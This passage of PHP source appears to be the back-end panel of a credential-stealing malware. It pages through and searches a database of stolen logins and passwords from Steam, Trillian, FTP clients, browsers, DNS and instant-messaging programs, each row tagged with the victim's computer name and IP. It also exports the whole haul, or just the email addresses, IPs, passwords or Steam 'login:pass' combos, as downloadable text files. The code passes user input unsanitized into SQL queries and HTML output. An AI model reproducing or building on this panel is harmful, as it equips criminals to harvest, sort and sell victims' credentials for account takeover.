		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '7' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS Trillian AiM **************************************************************************************
	} elseif ($_GET["action"] == "logs-trillaim") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '3';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '3' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS Trillian msn **************************************************************************************
	} elseif ($_GET["action"] == "logs-trillmsn") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '2';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '2' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS Trillian yahoo **************************************************************************************
	} elseif ($_GET["action"] == "logs-trillyahoo") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '4';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '4' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
				// LOGS ftp **************************************************************************************
	} elseif ($_GET["action"] == "list-ftp") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '15' OR `program` = '16' OR `program` = '17' OR `program` = '18';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '15' OR `program` = '16' OR `program` = '17' OR `program` = '18' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
				// LOGS browser **************************************************************************************
	} elseif ($_GET["action"] == "list-browsers") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '10' OR `program` = '11' OR `program` = '12' OR `program` = '13';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '10' OR `program` = '11' OR `program` = '12' OR `program` = '13' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
 
				// LOGS dns **************************************************************************************
	} elseif ($_GET["action"] == "list-dns") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '8' OR `program` = '9';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '8' OR `program` = '9' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
				// LOGS im **************************************************************************************
	} elseif ($_GET["action"] == "list-im") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '0' OR `program` = '1' OR `program` = '2' OR `program` = '3' OR `program` = '4' OR `program` = '5' OR `program` = '6';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '0' OR `program` = '1' OR `program` = '2' OR `program` = '3' OR `program` = '4' OR `program` = '5' OR `program` = '6' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
 
 
	// SEARCH ************************************************************************************
	} elseif ($_GET["action"] == "search") {
		if (isset($_POST["q"]) && isset($_POST["in"]) && is_numeric($_POST["in"]) && $_POST["in"]>0 && $_POST["in"]<=6) {
			$mysql = connect_database();
			$result = mysql_query("SELECT * FROM `logs` WHERE `".$cols[$_POST["in"]]."` LIKE '%".$_POST["q"]."%';", $mysql);
			if (!$result) die(mysql_error());
			
			if (mysql_num_rows($result) > 0) {
				$html .= $header.$javascript.$searchform."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='searchtable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<td>Program</td><td>Url / Host</td> 
					<td>Login</td><td>Password</td> 
					<td>Computer</td><td>Date</td> 
					<td>Ip</td> 
					<td><input type='checkbox' name='check_all' onClick='checkAll();'></td></tr>";
				$i = 0;
				while ($row = mysql_fetch_array($result)) {
					$html .= "<tr class='";

					if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

					$html .= "'><td>".$aplications[$row["program"]]."</td>";
					$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
					$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
					$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
					$i++;
				}
				$html .= "</table><div id='pages'><div id='numbers'>".mysql_num_rows($result)." results for '".$_POST["q"]."'</div><div id='buttons'> 
				<input name='buttonact' class='button def' type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> 
				<input name='buttonact' class='button def' type='submit' value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
			} else {
				$html .= $header.$searchform."<br>No results found!".$footer;
			}
			mysql_close($mysql);
		} else {
			$html .= $header.$searchform.$footer;
		}
		echo $html;
	
	// EXPORT ALL ************************************************************************************
	} elseif ($_GET["action"] == "exportall") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_export.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT * FROM `logs`;", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo "Program:\t".$aplications[$row['program']]."\r\n";
			echo "Url/Host:\t".$row['url']."\r\n";
			echo "Login:\t\t".$row['login']."\r\n";
			echo "Password:\t".$row['pass']."\r\n";
			echo "Computer:\t".$row['computer']."\r\n";
			echo "Date:\t\t".$row['date']."\r\n";
			echo "Ip:\t\t\t".$row['ip']."\r\n";
			echo "----------------------------------------------------------\r\n";
		}
		mysql_close($mysql);
		
		// EXPORT EMAILS ************************************************************************************
	} elseif ($_GET["action"] == "emails") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_emails.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT `login` FROM `logs` WHERE `login` LIKE '%@%';", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo $row['login']."\r\n";
		}
		mysql_close($mysql);
		
		// EXPORT ips ************************************************************************************
	} elseif ($_GET["action"] == "ips") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_ips.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT `ip` FROM `logs`;", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo $row['ip']."\r\n";
		}
		mysql_close($mysql);
		
		// EXPORT password list ************************************************************************************
	} elseif ($_GET["action"] == "pws") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_passwords.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT `pass` FROM `logs`;", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo $row['pass']."\r\n";
		}
		mysql_close($mysql);
		
		// EXPORT steams ************************************************************************************
	} elseif ($_GET["action"] == "steams") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_steams.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT * FROM `logs` WHERE `program` ='7';", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo $row['login'].":".$row['pass']."\r\n";
		}
		mysql_close($mysql);
		
		// EXPORT browsers ************************************************************************************
	} elseif ($_GET["action"] == "export-browsers") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_browsers.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '10' OR `program` = '11' OR `program` = '12' OR `program` = '13';", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo "Program:\t".$aplications[$row['program']]."\r\n";
			echo "Url/Host:\t".$row['url']."\r\n";
			echo "Login:\t\t".$row['login']."\r\n";
			echo "Password:\t".$row['pass']."\r\n";
			echo "Computer:\t".$row['computer']."\r\n";
			echo "Date:\t\t".$row['date']."\r\n";
			echo "Ip:\t\t\t".$row['ip']."\r\n";
			echo "----------------------------------------------------------\r\n";
		}
		mysql_close($mysql);
		
		// EXPORT ftp ************************************************************************************
	} elseif ($_GET["action"] == "export-ftp") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_ftp.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '15' OR `program` = '16' OR `program` = '17' OR `program` = '18';", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo "Program:\t".$aplications[$row['program']]."\r\n";
			echo "Url/Host:\t".$row['url']."\r\n";
			echo "Login:\t\t".$row['login']."\r\n";
			echo "Password:\t".$row['pass']."\r\n";
			echo "Computer:\t".$row['computer']."\r\n";
			echo "Date:\t\t".$row['date']."\r\n";
			echo "Ip:\t\t\t".$row['ip']."\r\n";
			echo "----------------------------------------------------------\r\n";
		}
		mysql_close($mysql);
		
		// EXPORT dns ************************************************************************************
	} elseif ($_GET["action"] == "export-dns") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_dns.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '8' OR `program` = '9';", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo "Program:\t".$aplications[$row['program']]."\r\n";
			echo "Url/Host:\t".$row['url']."\r\n";
			echo "Login:\t\t".$row['login']."\r\n";
			echo "Password:\t".$row['pass']."\r\n";
			echo "Computer:\t".$row['computer']."\r\n";
			echo "Date:\t\t".$row['date']."\r\n";
			echo "Ip:\t\t\t".$row['ip']."\r\n";
			echo "----------------------------------------------------------\r\n";
		}
		mysql_close($mysql);
		
		// EXPORT im ************************************************************************************
	} elseif ($_GET["action"] == "export-im") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=logs_im.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '0' OR `program` = '1' OR `program` = '2' OR `program` = '3' OR `program` = '4' OR `program` = '5' OR `program` = '6';", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo "Program:\t".$aplications[$row['program']]."\r\n";
			echo "Url/Host:\t".$row['url']."\r\n";
			echo "Login:\t\t".$row['login']."\r\n";
			echo "Password:\t".$row['pass']."\r\n";
			echo "Computer:\t".$row['computer']."\r\n";
			echo "Date:\t\t".$row['date']."\r\n";
			echo "Ip:\t\t\t".$row['ip']."\r\n";
			echo "----------------------------------------------------------\r\n";
		}
		mysql_close($mysql);
		
		//REMOVE NULL ENTRIES
		
		} elseif ($_GET["action"] == "remnull") {
		
		$mysql = connect_database();
		$num1 = mysql_query("SELECT count(*) FROM `logs` WHERE `pass` = '(null)';", $mysql);
		$result = mysql_query("DELETE FROM `logs` WHERE `pass` = '(null)';", $mysql);
		if (!$result) die(mysql_error());
		
